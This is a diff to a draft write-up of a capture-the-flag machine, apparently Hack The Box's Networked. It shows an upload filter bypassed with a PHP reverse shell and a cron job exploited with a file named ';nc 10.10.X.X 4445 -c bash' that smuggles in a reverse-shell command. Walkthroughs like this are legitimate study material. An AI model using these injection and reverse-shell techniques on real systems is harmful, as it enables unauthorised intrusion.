@@ -16,7 +16,7 @@ Alright, lets get down to it. First things first, nmap scan.
 
 ![nmap](../images/nmap_networked.png "nmap scan")
 
-While that was running, I went ahead and started running both a dirb and nikto.
+While that was running, I went ahead and started running both a dirb and nikto scan.
 
 `dirb http://10.10.10.146 -r`
 
@@ -28,7 +28,11 @@ While that was running, I went ahead and started running both a dirb and nikto.
 
 ## 2. Exploiting PHP
 
-During the enum phase, dirb identified `backup.tar`. Downloading the tar file and unpacking it reveals the workings of `upload.php`. Since we know how `upload.php` works, we can now upload a reverse shell and bypass the checks by modifying the request via Burp.
+During the enum phase, dirb identified `backup.tar`. Downloading the tar file and unpacking it reveals the workings of `upload.php`. THe `upload.php` file only checks the extension of the file and if its under 60000k.
+
+*insert vulnerbale php code screenshot*
+
+Since we know how `upload.php` works, we can now upload a reverse shell and bypass the checks by modifying the request via Burp. I used pentestmonkey's handy dandy reverse PHP shell.
 
 *insert screenshot of modifying request*
 
@@ -50,17 +54,18 @@ In the cron jobs section, we notice a job `check_attack`. Reading the contents o
 *more screenshots*
 Walla! It worked!
 
-Now that we know we can touch a file, lets look at the code in the `check_attack` cron a little more carefully to see if we can exploit this and escalate our privileges After looking over the code, there is one line that stands out in particularly:
+Now that we know we can touch a file, lets look at the code in the `check_attack` cron a little more carefully to see if we can exploit this and escalate our privileges. After looking over the code, there is one line that stands out in particularly:
 
 `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`
 
 If we touch a file into the uploads directory with the following name below:
 
-`;nc 10.10.14.23 4445 -c bash`
+`;nc 10.10.X.X 4445 -c bash`
 
 Everything after the `;` symbol will be treated as a completely separate command. So when the cron job runs, which is being ran under the user Guly, it will execute the nc command then open a shell back on our attacking machine.
 
 Success!
+
 *more screenshots*
 
 ## 4. Privilege Escalation to root
